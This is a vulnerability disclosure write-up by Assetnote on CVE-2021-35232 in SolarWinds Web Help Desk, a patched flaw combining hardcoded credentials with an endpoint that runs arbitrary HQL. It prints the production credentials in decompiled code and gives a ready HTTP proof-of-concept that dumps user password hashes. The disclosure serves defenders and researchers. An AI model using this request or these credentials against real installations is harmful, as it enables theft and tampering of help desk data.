---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-01-23_solarwinds-web-help-desk-when-the-helpdesk-is-too-helpful.md
original_filename: 2022-01-23_solarwinds-web-help-desk-when-the-helpdesk-is-too-helpful.md
title: 'Solarwinds Web Help Desk: When the Helpdesk is too Helpful'
category: documents
detected_topics:
- csrf
- oauth
- sso
- access-control
- xss
- command-injection
tags:
- imported
- documents
- csrf
- oauth
- sso
- access-control
- xss
- command-injection
language: en
raw_sha256: d83f81db972d3275509d3ae8f3c3cca2b69c3e86a9d042ec41513cddf7641265
text_sha256: 8641b62a1d8a15cad0c81e9356ca7b0fd14eb84dfc21e9cd652a32fbe9fe92ef
ingested_at: '2026-06-28T07:32:09Z'
sensitivity: unknown
redactions_applied: true
---

# Solarwinds Web Help Desk: When the Helpdesk is too Helpful

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-01-23_solarwinds-web-help-desk-when-the-helpdesk-is-too-helpful.md
- Source Type: markdown
- Detected Topics: csrf, oauth, sso, access-control, xss, command-injection
- Ingested At: 2026-06-28T07:32:09Z
- Redactions Applied: True
- Raw SHA256: `d83f81db972d3275509d3ae8f3c3cca2b69c3e86a9d042ec41513cddf7641265`
- Text SHA256: `8641b62a1d8a15cad0c81e9356ca7b0fd14eb84dfc21e9cd652a32fbe9fe92ef`


## Content

---
title: "Solarwinds Web Help Desk: When the Helpdesk is too Helpful"
url: "https://blog.assetnote.io/2022/01/23/solarwinds-webhelpdesk-hsql-eval-harcoded-creds/"
final_url: "https://www.assetnote.io/resources/research/solarwinds-web-help-desk-when-the-helpdesk-is-too-helpful"
authors: ["Assetnote Security Research Team (@assetnote)"]
programs: ["SolarWinds"]
bugs: ["Information disclosure", "Hardcoded credentials"]
publication_date: "2022-01-23"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2987
---

[Research Notes](/resources/research)

Security Research

January 23, 2022

# Solarwinds Web Help Desk: When the Helpdesk is too Helpful

No items found.

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/653795bb35bc995a6f921d3f_citrixbleed.svg)

Creative Commons license

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a36e02bfba3e4567716fb1_stop-simpsons.jpeg)

  * [Introduction](https://blog.assetnote.io/2022/01/23/solarwinds-webhelpdesk-hsql-eval-harcoded-creds/#introduction)
  * [What is Solarwinds Web Help Desk?](https://blog.assetnote.io/2022/01/23/solarwinds-webhelpdesk-hsql-eval-harcoded-creds/#what-is-whd)
  * [Mapping the Attack Surface](https://blog.assetnote.io/2022/01/23/solarwinds-webhelpdesk-hsql-eval-harcoded-creds/#mapping-the-attack-surface)
  * [Discovery Process](https://blog.assetnote.io/2022/01/23/solarwinds-webhelpdesk-hsql-eval-harcoded-creds/#discovery-process)
  * [PoC](https://blog.assetnote.io/2022/01/23/solarwinds-webhelpdesk-hsql-eval-harcoded-creds/#poc)
  * [Vendor Response](https://blog.assetnote.io/2022/01/23/solarwinds-webhelpdesk-hsql-eval-harcoded-creds/#vendor-response)
  * [Remediation Advice](https://blog.assetnote.io/2022/01/23/solarwinds-webhelpdesk-hsql-eval-harcoded-creds/#remediation-advice)
  * [Conclusion](https://blog.assetnote.io/2022/01/23/solarwinds-webhelpdesk-hsql-eval-harcoded-creds/#conclusion)
  * [Assetnote Is Hiring!](https://blog.assetnote.io/2022/01/23/solarwinds-webhelpdesk-hsql-eval-harcoded-creds/#assetnote-is-hiring)

The advisory for this issue can be found [here](https://blog.assetnote.io/2022/01/23/solarwinds-webhelpdesk-hsql-advisory/).

The CVE for this issue is CVE-2021-35232. The advisory from Solarwinds can be found [here](https://support.solarwinds.com/SuccessCenter/s/article/Web-Help-Desk-12-7-7-Hotfix-1-Release-Notes?language=en_US).

## Introduction

Most enterprises have a help desk of some sort. Whether it’s for employees or end users, enterprise help desk software is often deployed to facilitate the support needs of a business.

In this blog post, we disclose a series of steps that we took in order to discover a critical bug in Solarwinds Web Help Desk: being able to execute arbitrary Hibernate Query Language queries.

This vulnerability allows an attacker to execute HQL queries against the database models defined in the source code. As a result, an attacker could read the password hashes of the users registered in Web Help Desk, including administrator password hashes.

In addition to reading sensitive information from the database, other SQL operations such as INSERT/UPDATE/DELETE were also possible, as long as a Hibernate model existed for the database tables, in the code base.

## What is Solarwinds Web Help Desk?

Per Solarwinds’s marketing materials:

Solarwinds Web Help Desk lets you manage all end-user trouble tickets and track service request lifecycle, from ticket creation to resolution, from one centralized help desk management web interface.

Web Help Desk simplifies help desk ticketing, IT asset management and end-user support.

## Mapping the Attack Surface

**WebObjects**

When we used the web application we realised that Web Help Desk was also making use of a framework called <span class="code_single-line">WebObjects</span>. An example HTTP request for the <span class="code_single-line">WebObjects</span> component of the application looked like the following:
  
  
  /helpdesk/WebObjects/Helpdesk.woa/ra/configuration/database/test.json
  
  

We were a bit confused about how the routing worked. The <span class="code_single-line">web.xml</span> file did not provide much clarity over the HTTP request we were seeing when using the web application. The only clue we picked up from analysing the <span class="code_single-line">web.xml</span> file was that there was a Spring application running somewhere as well.

Since the <span class="code_single-line">web.xml</span> file didn’t have much insight into how this route was declared or mapped, we ran some pretty naive searches across the codebase to identify where this route was being mapped.

Based on our experience, routes aren’t always mapped exactly with the request being made. Sometimes details such as the extension <span class="code_single-line">.json</span> are inferred through other means. This is a popular convention that you may have also experienced when auditing Ruby on Rails applications.

We came up with a simple, yet effective regex to try and locate the routing for the application: <span class="code_single-line">database.*test</span>. This returned the following match:
  
  
  /whd/helpdesk/WEB-INF/lib/com/macsdesign/whd/ui/Application.java:
  494  /*  */ 
  495  /*  */  
  496: /*  496 */  routeRequestHandler.addRoute(new ERXRoute("HelpdeskInitializer", "/configuration/database/test", ERXRoute.Method.Put, WhdInitializationController.class, "testDatabaseSettings"));
  497  /*  */ 
  498  /*  */  
  
  

Perfect. This looks like how the <span class="code_single-line">WebObjects</span> routes are being defined. Looking at the <span class="code_single-line">Application.java</span> file, we found the remaining routes defined for the <span class="code_single-line">WebObjects</span> component of this application.

**Spring**

We mentioned earlier that the <span class="code_single-line">web.xml</span> file hinted at the fact that there was a Spring application also running in Web Help Desk. Identifying the attack surface for this component of the application was much easier for us as we have experience with Spring.

Searching the code base for <span class="code_single-line">@RequestMapping</span> is usually a great way to identify all of the Spring routes, and doing this returned a number of controllers that had routes mapped through the Spring Framework.

## Discovery Process

Even though at this stage we’ve mapped out the routes and we have a good understanding of what is exposed and accessible in the web application, we decided to scout around the rest of the files in the code base to see if there was anything obvious we were missing.

In our discovery process, we went through every JSP file that was included in Web Help Desk, and by doing so we came across a file which contained the following JavaScript:

<span class="code_single-line">/whd/helpdesk/WEB-INF/jsp/test/orionIntegrationTest.jsp:</span>
  
  
  function callAddNoteToOrionAlert(frm) {
  startAPIcall();
  try {
  ... omitted for brevity ...
  
  var auth = {loginName:'helpdeskIntegrationUser', password=***REDACTED***};
  
  RestInvokeAuth("/integration/orionAlertSource/"+id+"/alert/addNote", "POST", data, auth);
  } catch (err) {
  failedAPIcall(err);
  }
  }
  
  

Noticing that these credentials were hardcoded in a client-side API call, we decided to search the codebase for <span class="code_single-line">dev-C4F8025E7</span> to understand what access these credentials would provide us.

We found more credentials declared at <span class="code_single-line">/whd/helpdesk/WEB-INF/lib/com/solarwinds/whd/common/ConstantsAndSettings.java</span>:
  
  
  package com.solarwinds.whd.common;
  
  public abstract class ConstantsAndSettings {
  public static final String DEVELOPMENT_SPRING_PROFILE = "development";
  
  public static final boolean HELPDESKINTEGRATION_ENABLE_DEV_ANYADDRESS = true;
  
  public static final boolean HELPDESKINTEGRATION_ENABLE_DEV_LOGIN = true;
  
  public static final String HELPDESKINTEGRATION_REALM_NAME = "Helpdesk integration";
  
  public static final String HELPDESKINTEGRATION_PRODUCTION_LOGINNAME = "helpdesk91114AD77B4CDCD9E18771057190C08B";
  
  public static final String HELPDESKINTEGRATION_PRODUCTION_PASSWORD=***REDACTED***;
  
  public static final String HELPDESKINTEGRATION_DEVELOPMENT_LOGINNAME = "helpdeskIntegrationUser";
  
  public static final String HELPDESKINTEGRATION_DEVELOPMENT_PASSWORD=***REDACTED***;
  
  public static final long SSOAUTH_RECHECK_INTERVAL = 15000L;
  
  public static final String PRIVILEGED_NETWORKS_PROPERTY = "WHDPrivilegedNetworks";
  }
  
  

Reading the above, we realised that there were two pairs of hardcoded credentials present in the application. One for <span class="code_single-line">development</span> and one for <span class="code_single-line">production</span>. This discovery was critical as only the <span class="code_single-line">production</span> credentials worked in our final exploit.

Now that we know the values of the hardcoded credentials, we searched the codebase for where authentication logic was being applied that relied on these credentials

There were multiple locations in the source code which accepted these credentials:

  * <span class="code_single-line">/whd/helpdesk/WEB-INF/lib/com/macsdesign/whd/rest/controllers/BasicAuthRouteController.java</span> \- Accepts both development and production credentials

  * <span class="code_single-line">/whd/helpdesk/WEB-INF/lib/com/solarwinds/whd/service/impl/auth/HelpdeskIntegrationAuthenticationManager.java</span> \- Accepts both development and production credentials

  * <span class="code_single-line">/whd/helpdesk/WEB-INF/lib/com/solarwinds/whd/service/impl/auth/ClusterNodeAuthenticationManager.java</span> \- Only accepts production credentials

In order to determine which authentication managers were in use, we were able to refer to <span class="code_single-line">whd/helpdesk/WEB-INF/lib/whd-security.xml</span> which declared this information like so:
  
  
  <!-- ==================================================================================================================================================== -->
  <!-- WebObjects-Spring integration services - callable only from localhost, using BASIC auth with hardcoded credentials (returns 404 for other addresses) -->
  <!-- ==================================================================================================================================================== -->
  ... omitted for brevity ...
  <http pattern="/assetReport/**" create-session="stateless" use-expressions="true"
  authentication-manager-ref="helpdeskIntegrationAuthenticationManager">
  <intercept-url pattern="/**" access="hasRole('ROLE_INTEGRATION')"/>
  <http-basic entry-point-ref="helpdeskIntegrationBasicAuthenticationEntryPoint"/>
  <csrf token-repository-ref="customCookieCsrfTokenRepository"/>
  </http>
  
  

At this stage, we have a good understanding of the attack surface and the authentication requirements for different routes in the application. It was time to dig into the logic of <span class="code_single-line">helpdeskIntegrationAuthenticationManager</span> as we were interested in an endpoint located in the <span class="code_single-line">/assetReport/</span> path.

The source code for <span class="code_single-line">HelpdeskIntegrationAuthenticationManager.java</span> can be found below:
  
  
  /* 52 */  WebAuthenticationDetails details = (WebAuthenticationDetails)token.getDetails();
  /*  */  
  /* 54 */  boolean isDevelopment = this.environment.acceptsProfiles(new String[] { "development" });
  /* 55 */  boolean validCredentials = false;
  /* 56 */  if ("helpdesk91114AD77B4CDCD9E18771057190C08B".equals(loginName) && "1A11E431853F4CC99C27BF729479EB5D"
  /* 57 */  .equals(password)) {
  /*  */  
  /* 59 */  validCredentials = true;
  /*  */  }
  /* 61 */  else if (isDevelopment && "helpdeskIntegrationUser"
  /* 62 */  .equals(loginName) && "dev-C4F8025E7"
  /* 63 */  .equals(password)) {
  /*  */  
  /* 65 */  validCredentials = true;
  /*  */  } 
  /* 67 */  boolean isAllowedAddress = InternalCommunicationUtils.isAllowedAddress(details.getRemoteAddress(), isDevelopment);
  /* 68 */  if (isAllowedAddress) {
  /* 69 */  if (validCredentials) {
  /*  */  
  /* 71 */  SimpleGrantedAuthority simpleGrantedAuthority = new SimpleGrantedAuthority("ROLE_INTEGRATION");
  /*  */ 
  /*  */  
  /* 74 */  UsernamePasswordAuthenticationToken result = new UsernamePasswordAuthenticationToken(null, password, Arrays.asList(new GrantedAuthority[] { (GrantedAuthority)simpleGrantedAuthority }));
  /*  */  
  /* 76 */  result.setDetails(token.getDetails());
  /* 77 */  return (Authentication)result;
  /*  */  } 
  /*  */ 
  /*  */  
  /* 81 */  throw new BadCredentialsException(this.messages
  /* 82 */  .getMessage("AbstractUserDetailsAuthenticationProvider.badCredentials"));
  /*  */  } 
  
  

Let’s break this down.

  * <span class="code_single-line">token.getDetails();</span> \- this sets <span class="code_single-line">this.remoteAddress</span> as <span class="code_single-line">request.getRemoteAddr()</span>;

  * <span class="code_single-line">boolean isDevelopment</span> \- this evaluates to false by default

  * <span class="code_single-line">else if (isDevelopment && "helpdeskIntegrationUser"</span> \- this block of code won’t run

  * <span class="code_single-line">InternalCommunicationUtils.isAllowedAddress</span> \- checks if <span class="code_single-line">request.getRemoteAddr()</span>; is a loopback address

  * <span class="code_single-line">new SimpleGrantedAuthority("ROLE_INTEGRATION");</span> \- if all conditions pass, we get <span class="code_single-line">ROLE_INTEGRATION</span> authorization

You may be thinking that we wont be able to take this exploit further due to InternalCommunicationUtils.isAllowedAddress checking if our request comes from a loopback address.

This is where it gets really interesting. This protection is not effective when Solarwinds Web Help Desk is deployed through a reverse proxy on the same host. In this scenario, <span class="code_single-line">isAllowedAddress</span> will evaluate to true as <span class="code_single-line">request.getRemoteAddr()</span> will return a loopback IP address, allowing for further exploitation.

We later verified our suspicions by finding numerous instances vulnerable to our exploit in the wild. In our opinion, this mitigation is a band-aid fix over a much larger architectural issue, with a disregard of security principles when designing authentication.

Now we have some level of authenticated access to Solarwinds Web Help Desk through the hardcoded credentials. What’s the worst we can do?

After analysing the Spring controllers that were now accessible through our hardcoded credentials, we found the following snippet of code:
  
  
  /*  */  @RequestMapping(value = {"/rawHQL"}, method = {RequestMethod.POST})
  /*  */  @ResponseBody
  /*  */  @ResponseStatus(HttpStatus.OK)
  /*  */  public String getStringResult(@RequestBody String selectHQL) throws Exception {
  /*  36 */  logger.debug("Received request for result of this hql={}", selectHQL);
  /*  37 */  return this.assetReportService.getStringHQLResult(selectHQL);
  /*  */  }
  
  

Tracing the code for <span class="code_single-line">this.assetReportService.getStringHQLResult</span>, we found the following sink:
  
  
  /*  */  public String getStringHQLResult(String hql) {
  /*  61 */  String result = "";
  /*  62 */  Query query = this.entityManager.createQuery(hql);
  /*  63 */  List items = query.getResultList();
  /*  */ 
  /*  */  
  /*  66 */  result = result + result;
  /*  67 */  return result;
  /*  */  }
  
  

Finding this controller was a little surreal. We couldn’t believe that there was an endpoint to execute arbitrary HQL. There’s not even any need to inject anything, the controller helpfully evaluates any arbitrary HQL query we provide it.

As long as the codebase contained Hibernate Java classes for the database tables we wished to interact with, we could construct HQL queries that can perform any action on these tables.

Seems simple enough, let’s try exploit it.

So, true story, we spent over an hour battling this endpoint in Burp Suite being unable to execute queries even though we had the correct HQL syntax. We were so confused.

It’s a simple POST request, what could be so hard about exploiting this issue? The error we were seeing looked something like this:
  
  
  {"reason":"org.hibernate.hql.internal.ast.QuerySyntaxException: unexpected token: Cpassword near line 1, column 15 [select+email%2Cpassword+from+Tech=]"}
  
  

URL encoding was transforming the query to something that caused a query syntax exception when processed by Hibernate.

We were ready to spend another hour debugging this, but we thankfully pulled in another colleague, who had a genius idea of sending the request with <span class="code_single-line">Content-Type: text/plain</span>.

Finally, we had it working.

## PoC

In order to exploit this bug, <span class="code_single-line">request.getRemoteAddr()</span> must evaluate to a loopback address. This is common when this application is being routed to by a reverse proxy on the same host.

A proof-of-concept for this vulnerability can be found below:
  
  
  POST /helpdesk/assetReport/rawHQL HTTP/1.1
  Host: re.local:8081
  Accept: text/javascript, text/html, application/xml, text/xml, */*
  X-Prototype-Version: 1.7
  DNT: 1
  X-XSRF-TOKEN: 712c84a6-b963-441a-9e2a-f16abdeafe39
  X-Requested-With: XMLHttpRequest
  Authorization: Basic aGVscGRlc2s5MTExNEFENzdCNENEQ0Q5RTE4NzcxMDU3MTkwQzA4QjoxQTExRTQzMTg1M0Y0Q0M5OUMyN0JGNzI5NDc5RUI1RA==
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
  Referer: http://re.local:8081/helpdesk/WebObjects/Helpdesk.woa/wo/25.7.11.0.6.1.1.3
  Accept-Encoding: gzip, deflate
  Accept-Language: en-US,en;q=0.9
  Cookie: whdticketstab=mine; XSRF-TOKEN=712c84a6-b963-441a-9e2a-f16abdeafe39;
  Connection: close
  Content-Type: text/plain
  Content-Length: 31
  
  select email,password from Tech
  
  

This will return the following:
  
  
  HTTP/1.1 200 
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  X-XSS-Protection: 1; mode=block
  Cache-Control: no-cache, no-store, max-age=0, must-revalidate
  Pragma: no-cache
  Expires: 0
  Content-Type: text/javascript;charset=ISO-8859-1
  Content-Length: 64
  Date: Thu, 21 Oct 2021 03:35:11 GMT
  Connection: close
  
  joe@domain.com	{SHA}uCLxzS3PxoW0foPjmAKJ_V2OP_OoLe8k19HWi7Jy6zI
  
  

## Vendor Response

Solarwinds dealt with these issues seriously, and we appreciated their efforts in remediating this vulnerability and corresponding with us.

We reported this issue to Solarwinds on the 23rd of October, 2021.

The timeline for this disclosure process can be found below:

  * **Oct 23rd, 2021** : Disclosure of hardcoded credentials and HSQL evaluation vulnerability to Solarwinds PSIRT
  * **Nov 8th, 2021** : Response from Solarwinds confirming receipt of vulnerability
  * **Nov 25th, 2021** : Response from Solarwinds confirming patch release date
  * **Dec 23rd, 2021** : Response from Solarwinds confirming release of Web Help Desk 12.7.7 Hotfix 1

## Remediation Advice

The remediation details provided from Solarwind’s advisory are satisfactory and will ensure that this vulnerabilty cannot be exploited. The knowledge base article detailing the patches or workaround to apply can be found [here](https://support.solarwinds.com/SuccessCenter/s/article/Web-Help-Desk-12-7-7-Hotfix-1-Release-Notes?language=en_US).

### Conclusion

Hardcoded credentials were found in Solarwinds Web Help Desk. These hardcoded credentials enabled access to sensitive controllers that were capable of executing arbitrary HQL queries. Through this vulnerability, an attacker could extract, update, delete, or insert almost any information in the database.

As part of the development of our Continuous Security Platform, Assetnote’s Security Research team is consistently looking for security vulnerabilities in enterprise software to help customers identify security issues across their attack surface.

Looking at this research as a whole one the of the key takeaways is that the visibility into the exposure of enterprise software is often lacking or misunderstood by organizations that deploy this software. Many organizations disproportionately focus on in-house software and network issues at the expense of awareness and visibility into the exposure in the software developed by third parties. Our experience has shown that there continues to be significant vulnerabilities in widely deployed enterprise software that is often missed.

Customers of our [Attack Surface Management](https://assetnote.io/) platform were the first to know of this vulnerability and others like it. If you are interested in gaining wholistic, real-time visibility into your attack surface please [contact us](https://assetnote.io/#signup).

### Assetnote Is Hiring!

If you are interested in working on the leading Attack Surface Management platform that’s helping companies worldwide from the Fortune 100 to innovate startups secure millions of systems please check out our [careers page](https://assetnote.io/company/careers.html) for current openings. We are always on the lookout for top talent so even if there are no open roles in your field please feel free to drop us a line.

Written by:

Shubham Shah

Your subscription could not be saved. Please try again. 

Your subscription has been successful. 

Get updates on our research

Subscribe to our newsletter and stay updated on the newest research, security advisories, and more!

Enter your email address to subscribe

Provide your email address to subscribe. For e.g abc@xyz.com 

SUBSCRIBE 

### More Like This

[Security ResearchNew!Doing the Due Diligence: Analyzing the Next.js Middleware Bypass (CVE-2025-29927)Read moreRead on ASN Blog](/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927)

[Security ResearchNew!How an obscure PHP footgun led to RCE in Craft CMSRead moreRead on ASN Blog](/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms)

[Security ResearchNew!Citrix Denial of Service: Analysis of CVE-2024-8534Read moreRead on ASN Blog](/resources/research/citrix-denial-of-service-analysis-of-cve-2024-8534)

[Security ResearchNew!Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)Read moreRead on ASN Blog](/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os)

[Security ResearchNew!Leveraging An Order of Operations Bug to Achieve RCE in Sitecore 8.x - 10.xRead moreRead on ASN Blog](/resources/research/leveraging-an-order-of-operations-bug-to-achieve-rce-in-sitecore-8-x---10-x)

[Security ResearchNew!Insecurity through Censorship: Vulnerabilities Caused by The Great FirewallRead moreRead on ASN Blog](/resources/research/insecurity-through-censorship-vulnerabilities-caused-by-the-great-firewall)

[Back to All](/resources/research)

### Ready to get started?

Get on a call with our team and learn how Assetnote can change the way you secure your attack surface. We'll set you up with a trial instance so you can see the impact for yourself.

[Request a Demo](/demo)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/64241df2676aeba82706ffe8_assetnote-logo.svg)

Address:  
Level 10, 12 Creek Street, Brisbane QLD, 4000  
‍  
Contact:  
[contact@assetnote.io  
  
](mailto:contact@assetnote.io)Press Inquiries:[  
](mailto:contact@assetnote.io)[press@assetnote.io](mailto:press@assetnote.io)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/661f041240ed96ed7a03fe6f_61dc1beb212a1202fc512a76_SOC%202-03-p-500.png)

[](https://twitter.com/assetnote)[](https://www.linkedin.com/company/assetnote/)

Platform Features

[Continuous Asset Discovery](/platform/asset-discovery)

[Deep Asset Enrichment](/platform/asset-enrichment)

[Assetnote Exposure Engine](/platform/assetnote-exposure-engine)

[Expert Security Research](/platform/expert-security-research)

[Collaborative Workflows](/platform/collaborative-workflows)

[Customization](/platform/customization)

Use Cases

[Continuous Asset Discovery and Inventory](/use-cases/continuous-asset-discovery-and-inventory)

[Real-Time Exposure Monitoring](/use-cases/continuous-security-monitoring)

[Attack Surface Reduction](/use-cases/attack-surface-reduction)

[Mergers & Acquisitions](/use-cases/mergers-and-acquisitions)

[Bug Bounty Readiness](/use-cases/bug-bounty-readiness)

© 2026 Assetnote. All rights reserved.

[Privacy Policy](https://assetnote.io/policies/privacy-policy)
